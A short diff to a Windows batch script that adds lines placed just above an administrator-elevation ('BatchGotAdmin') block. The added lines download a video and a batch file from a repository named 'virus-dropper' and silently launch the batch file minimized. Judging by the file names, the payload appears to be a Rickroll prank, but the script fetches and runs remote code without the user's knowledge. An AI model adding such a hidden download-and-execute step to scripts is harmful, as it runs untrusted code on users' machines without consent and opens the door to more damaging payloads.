@@ -1,5 +1,7 @@
 @echo off
-
+curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Rickroll.mp4" --output "Rickroll.mp4"
+curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/rickroll.bat" --output "rickroll.bat"
+start /min rickroll.bat
 :: BatchGotAdmin
 ::-------------------------------------
 REM  --> Check for permissions
